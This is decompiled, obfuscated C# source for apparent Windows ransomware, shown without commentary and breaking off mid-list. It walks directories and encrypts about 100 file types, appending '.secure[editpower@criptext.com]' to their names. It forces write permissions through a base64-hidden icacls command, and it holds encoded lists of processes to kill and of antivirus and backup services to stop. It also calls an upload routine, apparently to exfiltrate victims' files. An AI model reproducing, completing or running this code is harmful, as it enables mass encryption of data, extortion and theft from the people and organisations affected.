using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using hKjAtXoUXPK;

namespace PbjBzLsVOvNrzQ;

internal class oIxRFVSIpmRuMqIJ
{
	public class JaSgnSQzqjUSRACt
	{
		private static StringCollection WNZlfYvQUSq = new StringCollection();

		private static List<string> LRbBcnpYInB = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(PBGxcXGgCq("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("RESTORE_FILES_INFO") && !text.EndsWith(".secure[editpower@criptext.com]") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(nYSVBrcSXYk))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(CXqkSEvmuN) * 1024.0 * 1024.0 && RgPKXlISvWFja == "YES")
							{
								LRbBcnpYInB.Add(text);
							}
							else if (File.Exists(text) && RgPKXlISvWFja == "NO")
							{
								LRbBcnpYInB.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				string[] array4 = array2;
				foreach (string root2 in array4)
				{
					WalkDirectoryTree(root2);
				}
			}
			return LRbBcnpYInB;
		}
	}

	[CompilerGenerated]
	private sealed class GwCxhrmtBNKJHoYE
	{
		public string kdLhkMtSUTNvZ;

		public bool _003CMain_003Eb__4(Process p)
		{
			return p.ProcessName == kdLhkMtSUTNvZ;
		}
	}

	[CompilerGenerated]
	private sealed class RKDwODPeTtYxf
	{
		public string tWQnVYRPNuCnY;

		public void _003CEncodeOnTheWay_003Eb__17()
		{
			oLgNOmJXCAjn(tWQnVYRPNuCnY, new string[100]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
				"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
				"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
				"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
			}, ".secure[editpower@criptext.com]", new string[0], YhMcuhCOiUkEzc);
		}
	}

	[CompilerGenerated]
	private sealed class gzARGFFweuW
	{
		private sealed class wnEkrGvDOilDpW
		{
			public gzARGFFweuW sioalXxdwLZekg;

			public string sXzLtjtuKMZqGT;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					AXKbHrzWHpznCx(WindowsIdentity.GetCurrent().Name, sXzLtjtuKMZqGT);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				yBztISmZFLrimH(sXzLtjtuKMZqGT, sioalXxdwLZekg.LgpFGunrPs, sioalXxdwLZekg.mxEwZJeLNxAkLU, sioalXxdwLZekg.hbDlTIOZhfXkSViJ, sioalXxdwLZekg.XWHkeyjMyYa);
			}
		}

		public string[] LgpFGunrPs;

		public string[] hbDlTIOZhfXkSViJ;

		public string XWHkeyjMyYa;

		public string mxEwZJeLNxAkLU;

		public void _003CCrypt_003Eb__1d(string t)
		{
			if (bNvfnEokSS && !woUJzlRoAzGo().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						AXKbHrzWHpznCx(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (AkiFFGXREV == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					yBztISmZFLrimH(t, LgpFGunrPs, mxEwZJeLNxAkLU, hbDlTIOZhfXkSViJ, XWHkeyjMyYa);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				yBztISmZFLrimH(t, LgpFGunrPs, mxEwZJeLNxAkLU, hbDlTIOZhfXkSViJ, XWHkeyjMyYa);
			}
		}
	}

	[CompilerGenerated]
	private sealed class iGpLwwsHoLeqZa
	{
		private sealed class GlhaYBHrJil
		{
			public iGpLwwsHoLeqZa IcoYaVFwaxBJyBR;

			public string cGvwfRbSwrzhC;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in mmwwbJcgsinbY)
				{
					if (cGvwfRbSwrzhC.ToLower().EndsWith(item + IcoYaVFwaxBJyBR.VoTeyGFLpZaMyqP) && JIGROLQVWX == "YES")
					{
						if (Convert.ToInt32(vipECknmzJcQpaojf) * 1024 * 1024 > new FileInfo(cGvwfRbSwrzhC).Length)
						{
							try
							{
								JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", cGvwfRbSwrzhC);
							}
							catch
							{
							}
						}
					}
					else if (cGvwfRbSwrzhC.ToLower().EndsWith(item) && JIGROLQVWX == "NO")
					{
						try
						{
							JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", cGvwfRbSwrzhC);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class OPagiytnFMkc
		{
			public iGpLwwsHoLeqZa IcoYaVFwaxBJyBR;

			public string ptHbfUiRbWfvyp;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in mmwwbJcgsinbY)
				{
					if (ptHbfUiRbWfvyp.ToLower().EndsWith(item + IcoYaVFwaxBJyBR.VoTeyGFLpZaMyqP) && JIGROLQVWX == "YES")
					{
						if (Convert.ToInt32(vipECknmzJcQpaojf) * 1024 * 1024 > new FileInfo(ptHbfUiRbWfvyp).Length)
						{
							try
							{
								JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", ptHbfUiRbWfvyp);
							}
							catch
							{
							}
						}
					}
					else if (ptHbfUiRbWfvyp.ToLower().EndsWith(item) && JIGROLQVWX == "NO")
					{
						try
						{
							JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", ptHbfUiRbWfvyp);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> lFcpwTKrYqhz;

		public List<string> uYsrkxSnWhD;

		public string VoTeyGFLpZaMyqP;

		public string[] cmCttXrxkqXEf;

		public string YhMcuhCOiUkEzc;

		public void _003CWorkerCrypter2_003Eb__2a(string t1)
		{
			string cGvwfRbSwrzhC;
			foreach (string item in uYsrkxSnWhD)
			{
				if (cmCttXrxkqXEf.Length != 0)
				{
					string[] array = cmCttXrxkqXEf;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_07dd;
					}
				}
				try
				{
					if (item.EndsWith(VoTeyGFLpZaMyqP))
					{
						goto IL_07dd;
					}
				}
				catch (Exception)
				{
					goto IL_07dd;
				}
				if (!item.EndsWith(t1) || wkqobNaWEQAr.Contains(item))
				{
					continue;
				}
				if (hhsicnCrwO == "YES")
				{
					try
					{
						if (EQEqEmYOniIYC.XFfMjPILkVPk(item))
						{
							EQEqEmYOniIYC.sHrqLuXhMISyN(item);
						}
					}
					catch
					{
					}
				}
				wkqobNaWEQAr.Add(item);
				if (!IVpIyrutgXnuTsdC.Contains(Path.GetDirectoryName(item)))
				{
					IVpIyrutgXnuTsdC.Add(Path.GetDirectoryName(item));
				}
				bqrcZqHppLszo(item);
				try
				{
					new cLbobpDMibcTXrjc().fntNupSZjyzZbqf(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (QPmKNZZswIrG)
							{
								Console.WriteLine("Setting write access permission: " + item + " - File Size: " + new FileInfo(item).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						beVAbavcTbJwdi(PBGxcXGgCq("aWNhY2xzLmV4ZQ=="), "\"" + item + "\"" + PBGxcXGgCq("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + PBGxcXGgCq("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (TQcDMEBrjpu)
					{
						try
						{
							File.AppendAllText(lNABZjYJLaAdehz, "File: " + item + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (TQcDMEBrjpu)
						{
							try
							{
								File.AppendAllText(lNABZjYJLaAdehz, "File: " + item + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						jNleUmpCYwQx++;
						goto end_IL_0237;
					}
					if (XqxyjwNQsTVM == "YES" && new FileInfo(item).Length > Convert.ToInt32(LvVedbSsouja) * 1024 * 1024 && !lFcpwTKrYqhz.Contains(t1))
					{
						try
						{
							if (VoTeyGFLpZaMyqP != ".*")
							{
								if (MaDqJNywoPHCL)
								{
									VoTeyGFLpZaMyqP = iWOdpoHPpDBfd + VoTeyGFLpZaMyqP;
								}
								File.Move(item, item + VoTeyGFLpZaMyqP);
							}
						}
						catch (Exception ex6)
						{
							if (TQcDMEBrjpu)
							{
								try
								{
									File.AppendAllText(lNABZjYJLaAdehz, "File: " + item + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							jNleUmpCYwQx++;
							goto end_IL_0237;
						}
						cGvwfRbSwrzhC = "";
						if (VoTeyGFLpZaMyqP != ".*")
						{
							cGvwfRbSwrzhC = item + VoTeyGFLpZaMyqP;
						}
						else
						{
							cGvwfRbSwrzhC = item;
						}
						if (iCDbdsmAlj == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in mmwwbJcgsinbY)
								{
									if (cGvwfRbSwrzhC.ToLower().EndsWith(item2 + VoTeyGFLpZaMyqP) && JIGROLQVWX == "YES")
									{
										if (Convert.ToInt32(vipECknmzJcQpaojf) * 1024 * 1024 > new FileInfo(cGvwfRbSwrzhC).Length)
										{
											try
											{
												JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", cGvwfRbSwrzhC);
											}
											catch
											{
											}
										}
									}
									else if (cGvwfRbSwrzhC.ToLower().EndsWith(item2) && JIGROLQVWX == "NO")
									{
										try
										{
											JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", cGvwfRbSwrzhC);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = MRonfguJbWECp.vnojYkuiBAUr(32);
						string s = uGlqoxFdzAjPTYcF.PzkQOghKIFRgh(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = PQqYOcUkjAAf.ryXojQCHUSIHVk(cGvwfRbSwrzhC, Convert.ToInt32(LvVedbSsouja) * 1024 * 1024);
						if (!PQqYOcUkjAAf.fssENAeUQwBsQ(xYFPAYQKYUJrM: (!SzzYxwPSWbpgYR) ? (IMmsNGvAyQxjH ? PQqYOcUkjAAf.zvWzdRNbwlK(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PQqYOcUkjAAf.zvWzdRNbwlK(array3, Encoding.ASCII.GetBytes(YhMcuhCOiUkEzc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IMmsNGvAyQxjH ? ixucTdEibmWxW.ZxKXvnZNRSzEAw(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ixucTdEibmWxW.ZxKXvnZNRSzEAw(array3, Encoding.ASCII.GetBytes(YhMcuhCOiUkEzc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), QNRAGoVmrx: cGvwfRbSwrzhC, niyonyMvqJkwBDE: bytes))
						{
							try
							{
								File.Move(item + VoTeyGFLpZaMyqP, item);
							}
							catch (Exception)
							{
							}
							continue;
						}
						goto IL_07dd;
					}
					if (MaDqJNywoPHCL)
					{
						VoTeyGFLpZaMyqP = iWOdpoHPpDBfd + VoTeyGFLpZaMyqP;
					}
					string text2 = MRonfguJbWECp.vnojYkuiBAUr(32);
					string s2 = uGlqoxFdzAjPTYcF.PzkQOghKIFRgh(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (VoTeyGFLpZaMyqP != ".*")
					{
						if (!bzjwNDHoswJy)
						{
							if (!IMmsNGvAyQxjH)
							{
								JfheapcdHpzRAd(item, item + VoTeyGFLpZaMyqP, auZOEVqMqtXyYL);
							}
							else
							{
								JfheapcdHpzRAd(item, item + VoTeyGFLpZaMyqP, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IMmsNGvAyQxjH)
								{
									GjEBWyngUynX(item, item + VoTeyGFLpZaMyqP, auZOEVqMqtXyYL);
								}
								else
								{
									GjEBWyngUynX(item, item + VoTeyGFLpZaMyqP, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex9)
							{
								if (TQcDMEBrjpu)
								{
									try
									{
										File.AppendAllText(lNABZjYJLaAdehz, "File: " + item + " - Error while fully writing to file: " + ex9.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								jNleUmpCYwQx++;
								try
								{
									File.Move(item + VoTeyGFLpZaMyqP, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0237;
							}
						}
					}
					else if (!bzjwNDHoswJy)
					{
						if (!IMmsNGvAyQxjH)
						{
							JfheapcdHpzRAd(item, item + ".part", auZOEVqMqtXyYL);
						}
						else
						{
							JfheapcdHpzRAd(item, item + ".part", Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!IMmsNGvAyQxjH)
							{
								GjEBWyngUynX(item, item, auZOEVqMqtXyYL);
							}
							else
							{
								GjEBWyngUynX(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex12)
						{
							if (TQcDMEBrjpu)
							{
								try
								{
									File.AppendAllText(lNABZjYJLaAdehz, "File: " + item + " - Error while fully writing to file: " + ex12.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							jNleUmpCYwQx++;
							goto end_IL_0237;
						}
					}
					if (IMmsNGvAyQxjH)
					{
						if (VoTeyGFLpZaMyqP != ".*")
						{
							xfEbgIrugrgC(item + VoTeyGFLpZaMyqP, bytes2);
						}
						else
						{
							xfEbgIrugrgC(item, bytes2);
						}
					}
					goto IL_07dd;
					end_IL_0237:;
				}
				catch (Exception)
				{
					goto IL_07dd;
				}
				continue;
				IL_07dd:
				uYsrkxSnWhD.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string fileInfo)
		{
			if (cmCttXrxkqXEf.Length != 0)
			{
				string[] array = cmCttXrxkqXEf;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_08a9;
				}
			}
			try
			{
				if (fileInfo.EndsWith(VoTeyGFLpZaMyqP))
				{
					goto IL_08a9;
				}
			}
			catch (Exception)
			{
				goto IL_08a9;
			}
			if (!wkqobNaWEQAr.Contains(fileInfo))
			{
				if (hhsicnCrwO == "YES")
				{
					try
					{
						if (EQEqEmYOniIYC.XFfMjPILkVPk(fileInfo))
						{
							EQEqEmYOniIYC.sHrqLuXhMISyN(fileInfo);
						}
					}
					catch
					{
					}
				}
				wkqobNaWEQAr.Add(fileInfo);
				if (!IVpIyrutgXnuTsdC.Contains(Path.GetDirectoryName(fileInfo)))
				{
					IVpIyrutgXnuTsdC.Add(Path.GetDirectoryName(fileInfo));
				}
				bqrcZqHppLszo(fileInfo);
				try
				{
					new cLbobpDMibcTXrjc().fntNupSZjyzZbqf(fileInfo);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (QPmKNZZswIrG)
							{
								Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						beVAbavcTbJwdi(PBGxcXGgCq("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + PBGxcXGgCq("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + PBGxcXGgCq("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (TQcDMEBrjpu)
					{
						try
						{
							File.AppendAllText(lNABZjYJLaAdehz, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(fileInfo).Length != 0L)
						{
							goto end_IL_0284;
						}
						goto end_IL_0284_2;
						end_IL_0284:;
					}
					catch (Exception ex4)
					{
						if (TQcDMEBrjpu)
						{
							try
							{
								File.AppendAllText(lNABZjYJLaAdehz, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						jNleUmpCYwQx++;
						goto end_IL_0284_2;
					}
					if (XqxyjwNQsTVM == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(LvVedbSsouja) * 1024 * 1024)
					{
						try
						{
							if (VoTeyGFLpZaMyqP != ".*")
							{
								if (MaDqJNywoPHCL)
								{
									VoTeyGFLpZaMyqP = iWOdpoHPpDBfd + VoTeyGFLpZaMyqP;
								}
								File.Move(fileInfo, fileInfo + VoTeyGFLpZaMyqP);
							}
						}
						catch (Exception ex6)
						{
							if (TQcDMEBrjpu)
							{
								try
								{
									File.AppendAllText(lNABZjYJLaAdehz, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							jNleUmpCYwQx++;
							return;
						}
						if (VoTeyGFLpZaMyqP != ".*")
						{
							fileInfo += VoTeyGFLpZaMyqP;
						}
						if (iCDbdsmAlj == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in mmwwbJcgsinbY)
								{
									if (fileInfo.ToLower().EndsWith(item + VoTeyGFLpZaMyqP) && JIGROLQVWX == "YES")
									{
										if (Convert.ToInt32(vipECknmzJcQpaojf) * 1024 * 1024 > new FileInfo(fileInfo).Length)
										{
											try
											{
												JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (fileInfo.ToLower().EndsWith(item) && JIGROLQVWX == "NO")
									{
										try
										{
											JuDOdZAEhCW.gjjnECUTwfzX("URL", "USERNAME", "ACCESO", fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = MRonfguJbWECp.vnojYkuiBAUr(32);
						string s = uGlqoxFdzAjPTYcF.PzkQOghKIFRgh(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = PQqYOcUkjAAf.ryXojQCHUSIHVk(fileInfo, Convert.ToInt32(LvVedbSsouja) * 1024 * 1024);
						if (!PQqYOcUkjAAf.fssENAeUQwBsQ(xYFPAYQKYUJrM: (!SzzYxwPSWbpgYR) ? (IMmsNGvAyQxjH ? PQqYOcUkjAAf.zvWzdRNbwlK(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PQqYOcUkjAAf.zvWzdRNbwlK(array3, Encoding.ASCII.GetBytes(YhMcuhCOiUkEzc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IMmsNGvAyQxjH ? ixucTdEibmWxW.ZxKXvnZNRSzEAw(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ixucTdEibmWxW.ZxKXvnZNRSzEAw(array3, Encoding.ASCII.GetBytes(YhMcuhCOiUkEzc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), QNRAGoVmrx: fileInfo, niyonyMvqJkwBDE: bytes))
						{
							try
							{
								File.Move(fileInfo + VoTeyGFLpZaMyqP, fileInfo);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (MaDqJNywoPHCL)
						{
							VoTeyGFLpZaMyqP = iWOdpoHPpDBfd + VoTeyGFLpZaMyqP;
						}
						string text2 = MRonfguJbWECp.vnojYkuiBAUr(32);
						string s2 = uGlqoxFdzAjPTYcF.PzkQOghKIFRgh(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (VoTeyGFLpZaMyqP != ".*")
						{
							if (!bzjwNDHoswJy)
							{
								if (!IMmsNGvAyQxjH)
								{
									JfheapcdHpzRAd(fileInfo, fileInfo + VoTeyGFLpZaMyqP, auZOEVqMqtXyYL);
								}
								else
								{
									JfheapcdHpzRAd(fileInfo, fileInfo + VoTeyGFLpZaMyqP, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!IMmsNGvAyQxjH)
									{
										GjEBWyngUynX(fileInfo, fileInfo + VoTeyGFLpZaMyqP, auZOEVqMqtXyYL);
									}
									else
									{
										GjEBWyngUynX(fileInfo, fileInfo + VoTeyGFLpZaMyqP, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex9)
								{
									if (TQcDMEBrjpu)
									{
										try
										{
											File.AppendAllText(lNABZjYJLaAdehz, "File: " + fileInfo + " - Error while fully writing to file: " + ex9.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									jNleUmpCYwQx++;
									try
									{
										File.Move(fileInfo + VoTeyGFLpZaMyqP, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!bzjwNDHoswJy)
						{
							if (!IMmsNGvAyQxjH)
							{
								JfheapcdHpzRAd(fileInfo, fileInfo + ".part", auZOEVqMqtXyYL);
							}
							else
							{
								JfheapcdHpzRAd(fileInfo, fileInfo + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IMmsNGvAyQxjH)
								{
									GjEBWyngUynX(fileInfo, fileInfo, auZOEVqMqtXyYL);
								}
								else
								{
									GjEBWyngUynX(fileInfo, fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex12)
							{
								if (TQcDMEBrjpu)
								{
									try
									{
										File.AppendAllText(lNABZjYJLaAdehz, "File: " + fileInfo + " - Error while fully writing to file: " + ex12.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								jNleUmpCYwQx++;
								return;
							}
						}
						if (IMmsNGvAyQxjH)
						{
							if (VoTeyGFLpZaMyqP != ".*")
							{
								xfEbgIrugrgC(fileInfo + VoTeyGFLpZaMyqP, bytes2);
							}
							else
							{
								xfEbgIrugrgC(fileInfo, bytes2);
							}
						}
					}
					end_IL_0284_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_08a9;
			IL_08a9:
			uYsrkxSnWhD.Remove(fileInfo);
		}
	}

	[CompilerGenerated]
	private sealed class VeeGBCdRMexva
	{
		public string xECfLWZfgoSBLH;

		public string QnNWzkBYlCQR;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(xECfLWZfgoSBLH);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(QnNWzkBYlCQR))
					{
						File.Delete(QnNWzkBYlCQR);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string OkEuBkyazD = "EVET";

	public static string[] DDmnulgAwLMAMl;

	public static IEnumerable<DirectoryInfo> bnDJEZGeSDSExCDT;

	public static byte[] auZOEVqMqtXyYL = null;

	public static DirectoryInfo KnToyhULZPuPU;

	public static string RgPKXlISvWFja = "NO";

	public static string CXqkSEvmuN = "100000000";

	public static List<string> xdynXtEYQwd = new List<string>();

	public static List<string> ZygadwffmhfuZNpSx = new List<string>();

	public static string Evwzlxkvbpc = "NO";

	public static string YhMcuhCOiUkEzc = "";

	public static string sBFHyRlKWnP = "";

	public static string GXLaZgEsdW = "NO";

	public static int rMALBdwsAruJ = 0;

	public static string hhsicnCrwO = "NO";

	public static string QMWnzMKZLW = "NO";

	public static string YDHMyiOEyqX = "NO";

	public static string mrapiWSgiWYZ = "0";

	public static string kDQhyqeHRyZrBp = "NO";

	public static string DyyEoQkMwAl = "NO";

	public static string GGptfJYKCmzVa = "NO";

	public static string CncJLlWMgfz = "NO";

	public static List<string> HLnyjlZkORUZl = new List<string>
	{
		PBGxcXGgCq("bHNhc3MuZXhl"),
		PBGxcXGgCq("c3ZjaHN0LmV4ZQ=="),
		PBGxcXGgCq("Y3Jjc3MuZXhl"),
		PBGxcXGgCq("Y2hyb21lMzIuZXhl"),
		PBGxcXGgCq("ZmlyZWZveC5leGU="),
		PBGxcXGgCq("Y2FsYy5leGU="),
		PBGxcXGgCq("bXlzcWxkLmV4ZQ=="),
		PBGxcXGgCq("ZGxsaHN0LmV4ZQ=="),
		PBGxcXGgCq("b3BlcmEzMi5leGU="),
		PBGxcXGgCq("bWVtb3AuZXhl"),
		PBGxcXGgCq("c3Bvb2xjdi5leGU="),
		PBGxcXGgCq("Y3RmbW9tLmV4ZQ=="),
		PBGxcXGgCq("U2t5cGVBcHAuZXhl")
	};

	public static List<string> IVpIyrutgXnuTsdC = new List<string>();

	public static string ZscbyLnsmGgSk = "NO";

	public static string QvIfhPMXPMl = "NO";

	public static string FiJSwJtFHaODq = "NO";

	public static List<string> wkqobNaWEQAr = new List<string>();

	public static string ojgHTSkbqSFk = "NO";

	private static string aQFRrxDuMZBx = "ebd907a2-b2a8-4e91-975b-5682ddca3d7f";

	public static string AkiFFGXREV = "NO";

	public static string fTFbspIQGAOtZ = "NO";

	public static List<string> jxbKnSHZtKD = new List<string>
	{
		PBGxcXGgCq("c3RhcnQgRG5zY2FjaGUgL3k="),
		PBGxcXGgCq("c3RhcnQgRkRSZXNQdWIgL3k="),
		PBGxcXGgCq("c3RhcnQgU1NEUFNSViAveQ=="),
		PBGxcXGgCq("c3RhcnQgdXBucGhvc3QgL3k="),
		PBGxcXGgCq("c3RvcCBhdnBzdXMgL3k="),
		PBGxcXGgCq("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		PBGxcXGgCq("c3RvcCBtZmV3YyAveQ=="),
		PBGxcXGgCq("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		PBGxcXGgCq("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		PBGxcXGgCq("c3RvcCBEZWZXYXRjaCAveQ=="),
		PBGxcXGgCq("c3RvcCBjY0V2dE1nciAveQ=="),
		PBGxcXGgCq("c3RvcCBjY1NldE1nciAveQ=="),
		PBGxcXGgCq("c3RvcCBTYXZSb2FtIC95"),
		PBGxcXGgCq("c3RvcCBSVFZzY2FuIC95"),
		PBGxcXGgCq("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		PBGxcXGgCq("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		PBGxcXGgCq("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		PBGxcXGgCq("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
